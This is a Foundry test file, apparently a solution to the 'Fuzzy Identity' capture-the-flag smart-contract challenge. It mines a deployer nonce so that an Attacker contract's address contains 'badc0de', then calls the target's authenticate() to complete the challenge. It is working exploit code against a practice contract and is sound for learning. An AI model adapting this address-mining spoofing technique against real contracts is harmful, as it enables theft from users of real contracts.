// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {FuzzyIdentityChallenge, IName} from "../src/FuzzyIdentityChallenge.sol";

contract FuzzyIdentityChallengeTest is Test {
    FuzzyIdentityChallenge internal fuzzy;
    Attacker internal attacker;

    function setUp() public {
        fuzzy = new FuzzyIdentityChallenge();
    }

    // function test_Find_Nonce() public {
    //     uint64 nonce = vm.getNonce(address(this));
    //     address _attacker = address(new Attacker());
    //     while (!isBadCode(_attacker)) {
    //         nonce++;
    //         vm.setNonce(address(this), nonce);
    //         // attacker = new Attacker{salt: bytes32(nonce)}();
    //         _attacker = address(new Attacker());
    //     }
    //     console2.log("nonce:", nonce);
    //     console2.log("address:", _attacker);
    // }

    /// @dev The following data was mined in test_Find_Nonce()
    /// @dev nonce: 23479289
    /// @dev address: 0x2C4C3ACE046024badC0de2Bf319876caD0727a24
    function test_Attack() public {
        vm.setNonce(address(this), 23479289);
        attacker = new Attacker();
        attacker.attack(address(fuzzy));
        assertTrue(fuzzy.isComplete());
    }

    function isBadCode(address _addr) internal pure returns (bool) {
        bytes20 addr = bytes20(_addr);
        bytes20 id = hex"000000000000000000000000000000000badc0de";
        bytes20 mask = hex"000000000000000000000000000000000fffffff";

        for (uint256 i = 0; i < 34; i++) {
            if (addr & mask == id) {
                return true;
            }
            mask <<= 4;
            id <<= 4;
        }

        return false;
    }
}

contract Attacker is IName {
    function name() public pure override returns (bytes32) {
        return bytes32("smarx");
    }

    function attack(address fuzzy) public {
        FuzzyIdentityChallenge(fuzzy).authenticate();
    }
}
